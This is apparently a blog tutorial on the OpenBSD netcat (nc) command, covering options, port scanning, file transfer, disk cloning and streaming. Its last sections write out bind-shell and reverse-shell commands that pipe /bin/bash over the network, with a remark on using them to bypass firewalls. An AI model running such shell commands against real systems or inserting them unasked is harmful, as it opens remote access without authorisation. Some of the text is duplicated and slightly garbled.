---
title: OpenBSD Netcat - nc Command with Examples
date: "2025-05-10 10:55:21 +0100"
updated: "2025-05-10 10:55:21 +0100"
id: netcat-nc-openbsd-example
lang: en
author: Iwan Setiawan
robots: index, follow
categories: openbsd
tags: UnixShell
background: https://gitflic.ru/project/unixbsdshell/ruby-static-page-jekyll-rb-openbsd/blob/raw?file=assets%2Fimages%2F27example%20of%20netcat%20command%20in%20openbsd.jpg
toc: true
comments: true
published: true
excerpt: This guide will take you from the basics to the advanced usage of the Netcat command in Linux. We will cover everything from simple network connections to more complex scenarios, as well as alternative approaches and common troubleshooting.
keywords: nc, netcat, Command, example, openbsd, shell
---

Are you having trouble or confusion while using the `nc` command in OpenBSD? You are not alone. Many developers also feel confused while using this versatile tool for network connections. Think of `nc` or Netcat as a pocket knife for your networking needs.

The nc command can read and write data across a network, making it an indispensable tool for every `OpenBSD` user.

This guide will take you from the basics to the advanced usage of the `nc` command in Linux. We will cover everything from simple network connections to more complex scenarios, as well as alternative approaches and common troubleshooting.

So, let's dive in and start mastering the `nc` command in **OpenBSD!**.

<br/>
<img alt="example of netcat command in openbsd" width="99%" class="lazyload" style="display: block; margin: auto;" src="{{ 'https://gitflic.ru/project/unixbsdshell/ruby-static-page-jekyll-rb-openbsd/blob/raw?file=assets%2Fimages%2F27example%20of%20netcat%20command%20in%20openbsd.jpg' | relative_url }}">
<br/>

## 1. What is Netcat

Are you having trouble or confusion when using the `nc` command in OpenBSD? You are not alone. Many developers also find themselves confused when it comes to using this versatile tool for network connections. Think of `nc` or Netcat as a pocket knife for your networking needs.

The `nc` command can read and write data across a network, making it an indispensable tool for any OpenBSD user.

This guide will take you from the basics to advanced usage of the `nc` command in Linux. We will cover everything from simple network connections to more complex scenarios, as well as alternative approaches and common troubleshooting.

So, let's dive in and start mastering the `nc` command in **OpenBSD!**.

## 2. Netcat Version

It just so happens that Netcat has many variants written by different authors. The original version was called netcat (nc). Netcat quickly gained recognition, but at some point its author stopped developing it and, despite its popularity, no one else started supporting it. For this reason, the program was rewritten several times by different authors, and sometimes completely from scratch.

The last original version of netcat was released in January 2007. The version used was 1.10. The original version of netcat was written by the author of the famous nmap program.

Ncat has become the official replacement for the original netcat in some Linux distributions, such as Red Hat Enterprise Linux, CentOS, which are often used as web servers.

For this reason, you will find Ncat on many computers in the network for example, on my virtual hosting, Ncat is installed as `Netcat`.

Ncat is shipped in the Nmap package and is therefore available for a variety of platforms, including Windows. This means that to install Ncat on Windows, simply install NMap.

## 3. Basic netcat commands

As you become more familiar with the nc command and become more proficient in using it, you will discover the true power of nc, as it has many advanced features. The flexibility of the `nc` command allows you to handle more complex networking tasks, such as creating a simple chat server or transferring files between systems.

Before we dive into the use of the `nc` command, let's get to know some of the arguments or command lines that can unlock advanced features of the `nc` command. Here is a table with some of the most commonly used `nc` arguments.

The table below outlines common `nc` command options:

| Option	    | Type	        | Description   |
| ----------- | -----------   | -----------   |
| -4	| Protocol	| Use IPv4 only. |
| -6	| Protocol	| Use IPv6 only. |
| -U,  --unixsock	| Protocol	| Use Unix domain sockets. |
| -u,  --udp	| Protocol	| Use UDP connection. |
| -g <hop1, hop2,...>	| Connect mode	| Set hops for loose source routing in IPv4. Hops are IP addresses or hostnames. |
| -p <port>,  --source-port <port>	| Connect mode	| Binds the Netcat source port to <port>. |
| -s <host>,  --source <host>	| Connect mode	| Binds the Netcat host to <host>. |
| -l,  --listen	| Listen mode	| Listens for connections instead of using connect mode. |
| -k,  --keep-open	| Listen mode	| Keeps the connection open for multiple simultaneous connections. |
| -v,  --verbose	 | Output	| Sets verbosity level. Use multiple times to increase verbosity. |
| -z	| Output	| Report connection status without establishing a connection. |


## 4. Basic Usage of NC Linux Commands: Step by Step Guide

Let's start with the basics. The `nc` command, also known as Netcat, can be used to create a simple network connection.

This can be very useful for testing network connectivity or transferring small amounts of data.

Here is a basic example of how to use the `nc` command:

| Option       | Command          | description        | 
| ----------- | -----------   | ----------- |
| -h          | nc -h          | Help          |
| -z          | nc -z      | 192.168.1.9 1-100	Port scan for a host or IP address          |
| -v          | nc -zv     | 192.168.1.9 1-100	Provide verbose output          |
| -n          | nc -zn          | 192.168.1.9 1-100	Fast scan by disabling DNS resolution          |
| -l          | nc -lp          | 8000	TCP Listen mode (for inbound connects)          |
| -w          | nc -w          | 180 192.168.1.9 8000	Define timeout value          |
| -k          | nc -kl          | 8000	Continue listening after disconnection          |
| -u          | nc -u          | 192.168.1.9 8000	Use UDP instead of TCP          |
| -q          | nc -q          | 192.168.1.9 8000	Client stay up after EOF          |
| -4          | nc -4          | 8000	IPv4 only          |
| -6          | nc -6          | 8000	IPv6 only          |

<br/>
### a. Client-server chat
Server (192.168.1.9)

```console
$ nc -lv 8000
```

Client
```console
$ nc 192.168.1.9 8000
```
<br/>
### b. Banner grabbing

```console
$ nc website.com 80
GET index.html HTTP/1.1
HEAD / HTTP/1.1

or

echo "" | nc -zv -wl 192.168.1.1 801-805
```
<br/>
### c. Port scanning

**Scan ports between 21 to 25**

```console
$ nc -zvn 192.168.1.1 21-25
```

**Scan ports 22, 3306 and 8080**

```console
$ nc -zvn 192.168.1.1 22 3306 8080
```
<br/>
### d. Proxy and port forwarding

```console
$ nc -lp 8001 -c "nc 127.0.0.1 8000"

or

$ nc -l 8001 | nc 127.0.0.1 8000
```

**Note:** Create a tunnel from one local port to another local port.

<br/>
### e. Download file

Server (192.168.1.9)

```console
$ nc -lv 8000 < file.txt
```

Client

```console
$ nc -nv 192.168.1.9 8000 > file.txt
```

**Note:** Suppose you want to transfer a file “file.txt” from server A to client B.

<br/>
### f. Upload files
Server (192.168.1.9)

```console
$ nc -lv 8000 > file.txt
```

Client

```console
$ nc 192.168.1.9 8000 < file.txt
```

**Note:** Suppose you want to transfer a file “file.txt” from client B to server A.

<br/>
### g. Transfer Directory
Server (192.168.1.9)

```console
$ tar -cvf – dir_name | nc -l 8000
```

Client

```console
$ nc -n 192.168.1.9 8000 | tar -xvf -
```

**Note:** Suppose you want to transfer a directory over a network from A to B.

<br/>
### h. Encrypt transfer
Server (192.168.1.9)

```console
$ nc -l 8000 | openssl enc -d -des3 -pass pass:password > file.txt
```

Client

```console
$ openssl enc -des3 -pass pass:password | nc 192.168.1.9 8000
```

**Note:** Encrypt data before transferring over the network.

<br/>
### i. Clones
Server (192.168.1.9)

```console
$ dd if=/dev/sda | nc -l 8000
```

Client

```console
$ nc -n 192.168.1.9 8000 | dd of=/dev/sda
```

**Note:** Cloning a Linux PC is very easy. Let's say your system disk is `/dev/sda`.

<br/>
### j. Video streaming
Server (192.168.1.9)

```console
$ cat video.avi | nc -l 8000
```

Client

```console
$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
```

**Note:** Streaming video with netcat

<br/>
### k. Remote shell
Server (192.168.1.9)

```console
$ nc -lv 8000 -e /bin/bash
```

Client

```console
$ nc 192.168.1.9 8000
```

**Note:** We have used remote shell using telnet and ssh but what if both are not installed and we don't have permission to install them then we can create remote shell using netcat also.

<br/>
### l. Reverse shell
Server (192.168.1.9)

```console
$ nc -lv 8000
```

Client

```console
$ nc 192.168.1.9 8000 -v -e /bin/bash
```

<br/>
**Note:** Reverse shells are often used to bypass firewall restrictions such as blocked incoming connections.

`Netcat or nc`, is a highly adaptable utility with a wide range of applications. This guide has illustrated how to use it through various examples, showing its capacity to establish connections, transfer data, and serve as an easy-to-use yet powerful networking tool.

For network enthusiasts and administrators, it is an excellent resource for debugging, port scanning, and connection establishment. It is an essential part of any networking toolkit due to its simple syntax and extensive functionality.

Users can leverage the capabilities of netcat to enhance their network-related tasks and troubleshooting efforts by using the knowledge they gain from this guide.
